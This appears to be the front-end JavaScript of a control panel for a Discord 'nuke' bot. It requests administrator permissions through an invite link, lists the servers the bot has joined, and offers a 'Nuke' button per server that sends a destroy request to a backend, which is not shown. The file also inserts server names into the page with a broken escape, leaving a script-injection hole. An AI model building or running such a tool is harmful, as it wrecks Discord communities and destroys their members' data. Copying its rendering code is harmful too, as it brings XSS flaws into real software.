let discordBotID;

window.onload = function () {

    sendRequest("info?method=id", callbackDiscordBotID);
    sendRequest("info?method=guilds", initGuilds);

    document.getElementById("invite").addEventListener("click", () => {
        inviteBot();
    });

    document.getElementById("logout").addEventListener("click", () => {
        document.cookie.split(";").forEach(function(c) { document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); });
        location.reload();
    });
}

function callbackDiscordBotID(param) {
    discordBotID = param;
}

function inviteBot() {
    if (discordBotID != null && discordBotID != undefined) {
        window.open("https://discord.com/api/oauth2/authorize?client_id=" + discordBotID + "&permissions=8&scope=bot", "_blank")
    } else {
        console.log("Can't get BotID");
    }
}

function initGuilds(message) {
    let json = JSON.parse(atob(message));

    if (message != undefined || message != null || message != "" || atob(message) != "") {
        if (atob(message) != "{}") {
        
            for (var i = 0; i < Object.keys(json).length; i++) {
                let id = json[i][0].id;
                let name = json[i][0].name;
                let img = json[i][0].avatar;
                let owner = json[i][0].owner;
    
                img = (img == undefined) ? "assets/server.png" : img;
                name = (name.includes("<")) ? name.replaceAll("<", "<\\") : name;
                owner = (owner.includes("<")) ? owner.replaceAll("<", "<\\") : owner;
    
                document.getElementById("card-placeholder").innerHTML += '<td><div id="' + id + '" class="server"><div class="card"><center><img alt="avatar" src="' + img + '"></center><div class="container"><h4><b>' + name + '</b></h4><h6>' + owner + '</h6><h6>' + id + '</h6><a class="btn btn-primary" onclick=\'nukeServer("' + id + '");\' role="button">Nuke</a></div></div></div></td>';
            }
    
        } else {
            document.getElementById("card-placeholder").innerHTML = '<center><h2 style="color: red;"><b>The bot is not on any server</b></h2></center>';
        }
    } else {
        document.getElementById("card-placeholder").innerHTML = '<center><h2 style="color: #ff99ff;"><b>...</b></h2></center>';
    }
    
}

function noAdminPermission(id) {
    messageBoxAlert("FAILED!", "Bot does not have administrator permission on server: " + id, "danger");
}

function messageBoxAlert(message, reason, type) {
    document.getElementById("alert-message").innerHTML = '<div class="alert alert-' + type + '"><strong>' + message + '</strong> ' + reason + '</div>';
}

function nukeServer(id) {
    sendRequest("nuke?id=" + id, null);
}